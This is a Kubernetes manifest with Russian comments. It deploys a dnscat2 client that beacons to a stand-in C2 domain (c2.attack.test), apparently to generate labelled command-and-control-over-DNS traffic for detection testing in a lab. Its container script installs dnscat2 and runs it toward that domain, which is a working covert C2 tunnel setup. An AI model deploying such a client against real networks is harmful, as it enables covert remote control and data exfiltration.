# dnscat2 client — C2 over DNS. Генерирует трафик: C2_BEACON, C2_TXT_REQUEST, HIGH_ENTROPY.
#
# Сервер (dnscat2) работает в namespace attack-server (servers/deploy.sh dnscat2).
# Задать ATTACK_DOMAIN (по умолчанию c2.attack.test) и задеплоить.
# Первый старт ~1–2 мин (gem install dnscat2). Требует больше памяти на этапе установки gem (компиляция).
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: dnscat2-client
  namespace: attack
  labels:
    app: attack-traffic
    tool: dnscat2
spec:
  replicas: 1
  selector:
    matchLabels:
      app: attack-traffic
      tool: dnscat2
  template:
    metadata:
      labels:
        app: attack-traffic
        tool: dnscat2
    spec:
      containers:
        - name: dnscat2
          image: ruby:3.2-alpine
          command: ["/bin/sh", "-c"]
          args:
            - |
              echo "Waiting for DNS..."
              sleep 15
              for i in 1 2 3 4 5; do
                apk add --no-cache build-base && break
                echo "apk failed (attempt $i/5), retrying in 20s..."
                sleep 20
              done
              for i in 1 2 3 4 5; do
                gem install dnscat2 && break
                echo "gem install failed (attempt $i/5), retrying in 20s..."
                sleep 20
              done
              command -v dnscat2 >/dev/null 2>&1 || { echo "FATAL: dnscat2 not installed"; sleep 3600; exit 1; }
              exec dnscat2 "$ATTACK_DOMAIN"
          env:
            - name: ATTACK_DOMAIN
              value: "c2.attack.test"
            - name: DNSCAT2_SECRET
              value: ""
          resources:
            requests:
              cpu: 100m
              memory: 256Mi
            limits:
              cpu: 1000m
              memory: 768Mi
      restartPolicy: Always
